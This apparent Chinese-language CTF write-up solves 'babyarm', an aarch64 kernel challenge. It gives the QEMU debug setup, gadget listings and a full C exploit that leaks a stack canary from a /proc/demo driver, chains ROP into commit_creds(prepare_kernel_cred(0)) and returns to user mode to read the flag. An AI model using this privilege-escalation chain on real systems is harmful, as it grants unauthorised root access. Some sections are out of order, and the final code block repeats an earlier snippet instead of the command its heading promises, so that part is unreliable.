
注释掉`cd /home/pwn`，是为了运行`exp`更方便，不然还得`cd`一下才能运行`exp`

这两条指令

```bash
echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict
```

这使得普通用户无法查看`dmesg`和`kallsyms`中的值（`kallsyms`中显示会全部为 0）

主要影响的是查看与`module`相关的调试信息，也就是在`/sys/module/core/section`查看地址会受到限制

还有就是会造成无法直接通过`/proc/kallsyms`来进行 leak kernel 基址

所以直接设置了`root`权限，方便本地调试，`root`可以直接查看地址

改动如下

```bash
# cd /home/pwn
# setsid cttyhack setuidgid 1000 sh
# setsid cttyhack setuidgid 0 sh
setsid /bin/cttyhack setuidgid 1000 /bin/sh
# setsid /bin/cttyhack setuidgid 0 /bin/sh
```

启动脚本

```bash
#!/bin/bash
# 编译 exp
~/gcc-linaro-7.5.0-2019.12-x86_64_aarch64-linux-gnu/bin/aarch64-linux-gnu-gcc exp.c -static -o rootfs/exp
# rootfs 打包
pushd rootfs
find . | cpio -o --format=newc > ../initramfs.cpio
popd
gzip initramfs.cpio
# 启动 gdb
gnome-terminal -e 'gdb-multiarch -x mygdbinit'
# 启动 qemu
# timeout --foreground 60 cnmd
qemu-system-aarch64 \
-m 256M \
-machine virt \
-cpu max \
-kernel ./Image \
-append "console=ttyAMA0 loglevel=3 oops=panic panic=1" \
-initrd ./initramfs.cpio.gz \
-monitor /dev/null \
-smp cores=1,threads=1 \
-nographic \
-s
```

我把下面这条注释了，不然调试一段时间会自动退出

```bash
timeout --foreground 60 cnmd
```

编译的话，先要装个工具链

<a href="elink@b12K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5k6h3I4W2j5i4y4W2M7#2)9J5k6h3I4A6L8X3q4J5L8#2)9J5k6h3!0J5k6#2)9J5c8X3y4G2L8i4m8G2L8X3g2F1N6s2y4Q4x3V1k6@1L8$3!0D9j5$3S2S2K9h3&6Q4x3V1k6T1K9h3&6S2M7X3W2W2M7#2)9J5c8X3I4S2N6r3g2K6N6q4)9J5k6o6N6Q4x3V1k6S2j5i4u0U0K9o6j5@1i4K6u0V1L8r3W2F1N6i4S2Q4x3X3c8Y4L8Y4g2Q4x3V1j5`."><mark class="encrypted">52fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5k6h3I4W2j5i4y4W2M7#2)9J5k6h3I4A6L8X3q4J5L8#2)9J5k6h3!0J5k6#2)9J5c8X3y4G2L8i4m8G2L8X3g2F1N6s2y4Q4x3V1k6@1L8$3!0D9j5$3S2S2K9h3&6Q4x3V1k6T1K9h3&6S2M7X3W2W2M7#2)9J5c8X3I4S2N6r3g2K6N6q4)9J5k6o6N6Q4x3V1k6S2j5i4u0U0K9o6j5@1i4K6u0V1L8r3W2F1N6i4S2Q4x3X3c8Y4L8Y4g2Q4x3V1j5`.</mark></a>

这个网站下载压缩包即可

交叉编译 aarch64

```bash
~/gcc-linaro-7.5.0-2019.12-x86_64_aarch64-linux-gnu/bin/aarch64-linux-gnu-gcc exp.c -static -o rootfs/exp
```

或者是直接装交叉编译环境

```bash
sudo apt-get install emdebian-archive-keyring
sudo apt-get install linux-libc-dev-arm64-cross libc6-arm64-cross
sudo apt-get install binutils-aarch64-linux-gnu gcc-8-aarch64-linux-gnu
sudo apt-get install g++-8-aarch64-linux-gnu
aarch64-linux-gnu-gcc-8 -static exp.c -o rootfs/exp
```

利用思路：

- `read` 函数 leak canary
- `write` 函数 写入 rop
- 先是内核空间执行`commit_creds(prepare_kernel_cred(0))`提权
- 然后返回用户态使用`orw`读取`flag`（`system`好像不行）

根据 aarch64 的特点，我们需要控制`x30`（返回地址），`x0`（第一个参数），然后`ret`即可，`ret`不会改变`sp`，这跟 x86 也是不一样的

我用到的三个 gadgets

```asm
.text:0000000000014F50 MOV W0, #0
.text:0000000000014F54 LDP X19, X20, [SP,#var_s10]
.text:0000000000014F58 LDP X21, X22, [SP,#var_s20]
.text:0000000000014F5C LDP X29, X30, [SP+var_s0],#0x30
.text:0000000000014F60 RET
.text:0000000000016958 LDP X21, X22, [SP,#0x50+var_30]
.text:000000000001695C LDP X23, X24, [SP,#0x50+var_20]
.text:0000000000016960 LDR X25, [SP,#0x50+var_10]
.text:0000000000016964 LDP X29, X30, [SP+0x50+var_50],#0x50
.text:0000000000016968 RET
// ret2_usr_mode
► 0xffff800008011fe4: msr sp_el0, x23
...
...
0xffff800008012024 msr elr_el1, x21
0xffff800008012028 msr spsr_el1, x22
0xffff80000801202c ldp x0, x1, [sp]
0xffff800008012030 ldp x2, x3, [sp, #0x10]
0xffff800008012034 ldp x4, x5, [sp, #0x20]
0xffff800008012038 ldp x6, x7, [sp, #0x30]
0xffff80000801203c ldp x8, x9, [sp, #0x40]
0xffff800008012040 ldp x10, x11, [sp, #0x50]
0xffff800008012044 ldp x12, x13, [sp, #0x60]
0xffff800008012048 ldp x14, x15, [sp, #0x70]
0xffff80000801204c ldp x16, x17, [sp, #0x80]
```

因为`x0`寄存器用作第一个参数，所以找了个有`MOV W0, #0`的 gadgets，`w0`只是`X0`的低 32 位，因为高三十二位本来就是 0

然后`commit_creds`和`prepare_kernel_cred`的地址都加了四，为了跳过`stp`指令对`x30`寄存器的修改，也就是下面这条

```asm
STP X29, X30, [SP,#-0x20+var_s0]!
```

这样才方便我们伪造`x30`方便后续 rop 的利用

构造 rop 的时候，要注意`sp`的变化，建议是多写一些`0xaaaaaaaaaaaaaaaa`这样的数据进去，方便调试，调试完再做替换即可，还有就是可以直接写`0xaaaaaaaa...0xbbbbbb...`，这样的东西，写多一些，然后看错误回显，看看执行了哪个地址，比如错误回显提示`call：0xaaaaaaaaaaaaaaaa`，那就可以将`0xaaaaaaaaaaaaaaaa`替换为我们要执行的地址，这样很快很方便

# exp

```c
#include <stdio.h>
#include <string.h>
#include <fcntl.h> //open
#include <stdlib.h> //size_t
#include <sys/stat.h>
#include <fcntl.h>
#define prepare_kernel_cred_addr 0xffff8000080a24f8
#define commit_creds_addr 0xffff8000080a2258
#define vmlinux_base_addr 0xffff800008000000
#define elf_base 0xffff800000e40000
#define ret2_user_mode 0xffff800008011fe4
void get_shell() {
printf("[+] got shell, welcome %s\n", (getuid() ? "user" : "root"));
// system("/bin/sh");
char buf[0x50] = {0};
int fd = open("/flag",0);
read(fd, buf, 0x50);
write(1, buf, 0x50);
}
int main() {
int fd = open("/proc/demo", O_RDWR);
size_t mem[0x200];
memset(mem, '\x00', sizeof(mem));
read(fd, mem, 128+8);
size_t canary = mem[16];
printf("[+] canary = %p\n", canary);
// write
memset(mem, '\x00', sizeof(mem));
memset(mem, 'a', 0x80);
mem[16] = canary;
mem[17] = 0xaaaaaaaaaaaaaaaa;
// mem[18] = 0xbbbbbbbbbbbbbbbb;
mem[18] = vmlinux_base_addr+0x14F50;
mem[19] = 0xcccccccccccccccc;
mem[20] = 0xdddddddddddddddd;
mem[21] = 0xeeeeeeeeeeeeeeee;
// mem[22] = 0xffffffffffffffff;
mem[22] = prepare_kernel_cred_addr+4;
// mem[23] = commit_creds_addr+4;
mem[23] = 0xaaaaaaaaaaaaaaaa;
mem[24] = 0xccccccccdddddddd;
mem[25] = 0xeeeeeeeeffffffff;
mem[26] = 0xaaaaaaaabbbbbbbb;
mem[27] = 0xccccccccdddddddd;
// mem[28] = vmlinux_base_addr+0x14F5C;
mem[28] = commit_creds_addr+4;
// mem[29] = 0xaaaaaaaaaaaaaaaa;
// mem[30] = 0xbbbbbbbbbbbbbbbb;
mem[31] = 0xcccccccccccccccc;
mem[32] = vmlinux_base_addr+0x16958;
mem[33] = 0xaaaaaaaaaaaaaaaa;
mem[34] = 0xbbbbbbbbbbbbbbbb;
mem[35] = 0xcccccccccccccccc;
mem[35] = 0xdddddddddddddddd;
mem[36] = 0xccccccccdddddddd;
mem[37] = 0xeeeeeeeeffffffff;
mem[38] = ret2_user_mode;
mem[39] = 0xccccccccdddddddd;
mem[40] = 0xaaaaaaaabbbbbbbb;
mem[41] = (size_t)get_shell;
mem[42] = 0x80001000;
mem[43] = (size_t)mem;
write(fd,mem,0x200);
close(fd);
}
```

# babyarm

## 概述

一道不常见的 aarch64 kernel pwn，这题很简单就简单栈溢出，`msr` 返回用户态 `orw` 即可

但就是返回用户态的机制不太好了解，然后流程控制也跟常规的 x86 那种有很大区别

## 代码审计

`device_read` 函数

![](https://bbs.kanxue.com/upload/attach/202204/933934_9DQYYEV9PTKRVUK.png)

`device_write` 函数

![](https://bbs.kanxue.com/upload/attach/202204/933934_2KU5EXCEDNWUC5T.png)

存在栈溢出漏洞

审一下代码就可以知道，红色框框中的东西一定会进，`read` 用来 leak，`write` 用来 rop

其实不怎么审代码，下好断点调试也可以知道进入哪里

`vmlinux` 从镜像中拉出来地址全是乱的。。。

gadgets 可以通过调试去找，直接在`gdb`里面找，还好这题 rop 不复杂，不然痛苦死了

但这个方法也不好，后面发现这个 aarch64 的`Image`文件可以直接`ida`，但是只有偏移地址，但没关系

这题没开`kaslr`，直接查内核基址再加上偏移就可以了

```bash
# 查程序基址 各个节
grep demo /proc/modules
grep "0x" /sys/module/demo/sections/.*
# 查 vmlinux 符号
grep prepare_kernel_cred /proc/kallsyms
grep commit_creds /proc/kallsyms
grep _text /proc/kallsyms
# vmlinux 内核基址
```

然后说说 aarch64 的一些简单的汇编指令和知识

寻址格式，`#` 代表立即数

```asm
[sp, #0x10]      // 从 sp+0x10 的地方取值
[sp, #0x10]!     // 从 sp+0x10 的地方取值，取完值后 sp+0x10
[sp], #0x10      // 从 sp 的地方取值，取完值后 sp+0x10
```

寄存器

在 aarch64 汇编中寄存器是 64 位的，使用`X[n]`表示，低 32 位以`W[n]`表示

在 64 位架构中有 31 个 64 位的通用寄存器

使用如下指令在`pwndbg`中查看

```asm
[sp, #0x10]      // 从 sp+0x10 的地方取值
[sp, #0x10]!     // 从 sp+0x10 的地方取值，取完值后 sp+0x10
[sp], #0x10      // 从 sp 的地方取值，取完值后 sp+0x10
```
